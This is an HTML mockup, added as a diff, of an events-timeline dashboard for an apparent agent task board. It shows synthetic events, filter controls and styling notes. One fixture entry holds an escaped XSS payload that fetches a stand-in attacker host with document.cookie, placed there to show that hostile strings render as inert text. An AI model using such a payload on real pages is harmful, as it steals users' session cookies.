@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BT-073 mockup — events timeline</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#161b22; --bg3:#1c2330; --line:#30363d;
+  --fg:#e6edf3; --muted:#8b949e; --accent:#58a6ff;
+  --green:#3fb950; --green-bright:#56d364;
+  --red:#f85149; --red-bright:#ff7b72;
+  --orange:#d29922; --orange-bright:#e3b341;
+  --blue:#58a6ff; --purple:#bc8cff; --cyan:#56d4dd;
+  --gray:#6e7681; --gray-bright:#9ea7b3;
+  --r-ctl:6px; --r-card:10px;
+  --mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+}
+*{box-sizing:border-box}
+body{margin:0 auto;max-width:860px;background:var(--bg);color:var(--fg);
+  font:14px/1.45 -apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;padding:32px 18px}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+code,.mono{font-family:var(--mono)}
+h1{font-size:16px;font-weight:600}
+h1 .sub{display:block;color:var(--muted);font-size:12px;font-weight:400;margin-top:4px}
+
+.panel{background:var(--bg2);border:1px solid var(--line);border-radius:var(--r-card);padding:20px}
+.toolbar{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:18px}
+.toolbar input[type=text],.toolbar select{background:var(--bg3);
+  border:1px solid var(--line);color:var(--fg);border-radius:var(--r-ctl);padding:5px 10px}
+.toolbar input[type=text]{width:200px}
+.countline{margin-left:auto;color:var(--muted);font-size:12px}
+
+ol.timeline{list-style:none;margin:0;padding:0;position:relative}
+ol.timeline::before{content:"";position:absolute;left:5px;top:6px;bottom:6px;width:2px;background:var(--line)}
+.tl-item{position:relative;padding:0 0 18px 26px}
+.tl-item:last-child{padding-bottom:0}
+.tl-item::before{content:"";position:absolute;left:1px;top:5px;width:8px;height:8px;
+  border-radius:50%;background:var(--bg3);border:2px solid var(--muted)}
+.tl-item.tl-audit::before{border-color:var(--purple)}
+.tl-item.tl-complete::before{border-color:var(--green)}
+.tl-head{display:flex;gap:8px;align-items:baseline;flex-wrap:wrap;font-size:12px;color:var(--muted)}
+.tl-head .ts{font-family:var(--mono)}
+.tl-head .actor{color:var(--fg)}
+.tl-detail{margin-top:5px;font-size:13px;max-width:640px}
+.tl-detail code{color:var(--cyan);word-break:break-word}
+.tl-raw{margin-top:5px;font-size:12px;color:var(--gray-bright);font-family:var(--mono);
+  background:var(--bg3);border:1px solid var(--line);border-radius:var(--r-ctl);padding:6px 10px;
+  word-break:break-word}
+.ladder-note{display:inline-block;margin-left:6px;font-size:11px;color:var(--muted)}
+
+.etag{display:inline-block;border:1px solid var(--line);border-radius:var(--r-ctl);
+  padding:0 6px;font-size:11px;font-family:var(--mono);color:var(--muted);white-space:nowrap}
+
+.legend{margin-top:18px;padding-top:12px;border-top:1px solid var(--line);
+  color:var(--muted);font-size:12px}
+</style>
+</head>
+<body>
+<h1>Events timeline (BT-073 mockup)
+  <span class="sub">R14: chronological, detail ladder DECODED (analytics §2.4), client-side filters by event_type and task id, hostile strings render as text (R16).</span>
+</h1>
+
+<div class="panel">
+  <div class="toolbar" role="group" aria-label="event filters">
+    <select aria-label="event type filter">
+      <option>event_type: all</option>
+      <option>task_created</option><option>task_dispatched</option><option>task_completed</option>
+      <option>task_updated</option><option>worker_dispatched</option>
+      <option>tick</option><option>audit</option><option>board_init</option>
+    </select>
+    <input type="text" placeholder="filter by task id…" aria-label="filter events by task id">
+    <span class="countline" aria-live="polite">92 events · 5 shown</span>
+  </div>
+
+  <ol class="timeline">
+    <li class="tl-item tl-complete">
+      <div class="tl-head">
+        <span class="ts">2026-10-01 20:41:09</span>
+        <span class="etag">task_completed</span>
+        <span>actor:</span><span class="actor">worker wt/BT-065</span>
+        <span>task:</span><a href="#b=demo-fleet-alpha&t=BT-065">BT-065</a>
+      </div>
+      <div class="tl-detail">
+        <code>{
+  "commit": "7f36a13",
+  "tests": "green",
+  "lines": "+57 -12"
+}</code>
+        <span class="ladder-note">ladder step 2 — string decoded to JSON</span>
+      </div>
+    </li>
+
+    <li class="tl-item">
+      <div class="tl-head">
+        <span class="ts">2026-10-01 20:58:00</span>
+        <span class="etag">tick</span>
+        <span>actor:</span><span class="actor">scheduler</span>
+        <span>task:</span><span>—</span>
+        <span class="etag">tick_number 412</span>
+      </div>
+      <div class="tl-raw">board tick 99 — DF-BOARDCTL-24 complete (verification-only; premise disproven, tick 98 row-flip recovered)</div>
+      <span class="ladder-note">ladder fall-through — raw string kept verbatim</span>
+    </li>
+
+    <li class="tl-item tl-audit">
+      <div class="tl-head">
+        <span class="ts">2026-10-01 21:15:37</span>
+        <span class="etag">audit</span>
+        <span>actor:</span><span class="actor">judge</span>
+        <span>task:</span><a href="#b=demo-fleet-alpha&t=BT-063">BT-063</a>
+      </div>
+      <div class="tl-detail">
+        <code>{"verdict":"PASS","tier":2,"notes":"decoded 87/92 details at step 2, 5 at step 3"}</code>
+        <span class="ladder-note">ladder step 2</span>
+      </div>
+    </li>
+
+    <li class="tl-item">
+      <div class="tl-head">
+        <span class="ts">2026-10-01 21:30:12</span>
+        <span class="etag">worker_dispatched</span>
+        <span>actor:</span><span class="actor">scheduler</span>
+        <span>task:</span><a href="#b=demo-fleet-alpha&t=BT-062">BT-062</a>
+      </div>
+      <div class="tl-detail">
+        <code>{"worker":"wt/BT-062","model":"glm-5.3-flash"}</code>
+        <span class="ladder-note">ladder step 3 — base64-wrapped JSON decoded</span>
+      </div>
+    </li>
+
+    <li class="tl-item">
+      <div class="tl-head">
+        <span class="ts">2026-10-01 21:44:56</span>
+        <span class="etag">board_init</span>
+        <span>actor:</span><span class="actor">foreman</span>
+        <span>task:</span><span>—</span>
+      </div>
+      <div class="tl-raw">&lt;script&gt;fetch('http://evil.example/'+document.cookie)&lt;/script&gt; and a &lt;/script&gt; for good measure — R16: renders inert as text, never markup; the page never throws</div>
+      <span class="ladder-note">ladder fall-through — hostile raw string, text-only render</span>
+    </li>
+  </ol>
+
+  <div class="legend">
+    spine dots: muted = neutral · green = completion · purple = audit — decoration only; the event_type label is the signal (color never carries meaning alone).
+    task links scroll to the row and expand it; <span class="mono">—</span> = null task_id (board-level events).
+    Filters compose AND; zero matches render the timeline empty-state, never a blank region (§5.7).
+  </div>
+</div>
+
+<p style="color:var(--muted);font-size:12px;margin-top:18px">
+  BT-073 mockup · fixtures are synthetic (demo-fleet/alpha) · detail ladder per analytics spec §2.4
+</p>
+</body>
+</html>
